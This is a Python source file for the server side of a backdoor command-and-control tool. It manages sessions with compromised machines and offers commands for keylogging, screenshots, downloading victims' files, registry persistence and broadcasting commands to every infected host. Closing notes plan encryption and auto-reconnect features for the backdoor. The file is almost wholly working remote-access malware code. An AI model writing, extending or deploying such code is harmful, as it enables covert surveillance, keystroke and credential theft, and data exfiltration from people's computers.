#possible dependency
import datetime
import socket
import termcolor    #pip install termcolor
import pyautogui    #pip install pylance
import json
import os
import threading

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

#This function is to stop server.py issuing reliable_send if command='help' or 'clear'
#Creates less network traffic.
def exclusion_words(command):
    exclusion_words = ['help', 'clear'] #make this global variable
    if command == exclusion_words :
        return 1

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(2)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def screenshot(target, count):
    directory = './screenshots'
    if not os.path.exists(directory):
        os.makedirs(directory)
    f = open(directory + '/screenshot_%d.png' % (count), 'wb') #if target=Linux then #apt-get install scrot
    target.settimeout(3)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    count += 1

def server_help_manual():
    print('''\n
    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background                          --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges


    \n''')

def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n''')

def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            screenshot(target, count)
        elif command == 'help':
            server_help_manual()
        else:
            result = reliable_recv(target)
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass

#Work in progress (currently 'exit' command is buggy when issued from c2()
def c2():
    while True:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                counter = 0
                for ip in ips:
                    print('Session ' + str(counter) + ' --- ' + str(ip))
                    counter += 1
            elif command == 'clear':
                os.system('clear')
            elif command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(tarnum, tarip)
                except:
                    print('[-] No Session Under That ID Number')
            elif command == 'exit':
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                stop_flag = True
                t1.join()
                break
            elif command[:4] == 'kill':
                targ = targets[int(command[5:])]
                ip = ips[int(command[5:])]
                reliable_send(targ, 'quit')
                targ.close()
                targets.remove(targ)
                ips.remove(ip)
            elif command[:7] == 'sendall':
                x = len(targets)
                print(x)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        print(tarnumber)
                        reliable_send(tarnumber, command)
                        i += 1
                except:
                    print('Failed')
            elif command[:4] == 'help':
                c2_help_manual()
            else:
                print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
        except (KeyboardInterrupt, SystemExit):
            if (input('\nDo you want to exit? yes/no: ') == 'yes'):
                break
        except ValueError as e:
            print('[!!] ValueError: ' + str(e))
            continue 
        finally:
            sock.close()
            print('\n[-] C2 Socket Closed! Bye!!')

def exit_c2(targets): #function of: elif command == 'exit':
    for target in targets:
        reliable_send(target, 'quit')
        target.close()
    sock.close()
    stop_flag = True
    t1.join()
    SystemExit()

targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))  #sudo fuser -k 5555/tcp 
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print('Run "help" command to see the usage manual')
print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))

#c2()

#Command and control code (legacy)
while True:
    try:
        command = input('[**] Command & Control Center: ')
        if command == 'targets':
            counter = 0
            for ip in ips:
                print('Session ' + str(counter) + ' --- ' + str(ip))
                counter += 1
        elif command == 'clear':
            os.system('clear')
        elif command[:7] == 'session':
            try:
                num = int(command[8:])
                tarnum = targets[num]
                tarip = ips[num]
                target_communication(tarnum, tarip)
            except:
                print('[-] No Session Under That ID Number')
        elif command == 'exit':
            for target in targets:
                reliable_send(target, 'quit')
                target.close()
            sock.close()
            stop_flag = True
            t1.join()
            break
        elif command[:4] == 'kill':
            targ = targets[int(command[5:])]
            ip = ips[int(command[5:])]
            reliable_send(targ, 'quit')
            targ.close()
            targets.remove(targ)
            ips.remove(ip)
        elif command[:7] == 'sendall':
            x = len(targets)
            print(x)
            i = 0
            try:
                while i < x:
                    tarnumber = targets[i]
                    print(tarnumber)
                    reliable_send(tarnumber, command)
                    i += 1
            except:
                print('Failed')
        elif command[:4] == 'help':
            c2_help_manual()
        else:
            print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
    except (KeyboardInterrupt, SystemExit):
        if (input('\nDo you want to exit? yes/no: ') == 'yes'):
            sock.close()
            print(termcolor.colored('\n[-] C2 Socket Closed! Bye!!', 'yellow'))
            break
    except ValueError as e:
        print(termcolor.colored('[!!] ValueError: ' + str(e), 'red'))
        continue 


"""
Possibly improvements

-Consider encrypting the connection using custom (AES128-GCM-DH-SHA256) or HTTPS (lots of traffic w/ HTTP)
-Implement a 'pulse' feature between server and backdoor (Keep alive):

This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket 
and will attempt to run connection() function again.
"""